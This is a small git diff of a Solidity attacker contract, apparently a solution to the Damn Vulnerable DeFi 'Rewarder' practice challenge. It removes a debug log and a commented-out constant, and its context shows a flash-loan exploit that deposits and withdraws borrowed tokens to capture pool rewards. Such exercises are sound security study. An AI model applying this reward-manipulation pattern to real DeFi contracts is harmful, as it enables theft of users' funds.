@@ -12,7 +12,6 @@ contract RewarderPoolAttacker {
     FlashLoanerPool flashPool;
     TheRewarderPool rewarderPool;
     DamnValuableToken liquidityToken;
-    // uint256 constant amount = 1000000 ether;
     RewardToken rewardToken;
 
     constructor(address _flashPoolAddress, address _rewarderPoolAddress, address _tokenAddress, address _rewardToken) {
@@ -30,7 +29,6 @@ contract RewarderPoolAttacker {
 
     function receiveFlashLoan(uint256 amount) public {
         liquidityToken.approve(address(rewarderPool), amount);
-        console.log(amount, "ohoo");
         rewarderPool.deposit(amount);
         rewarderPool.withdraw(amount);
         liquidityToken.transfer(address(flashPool), amount);
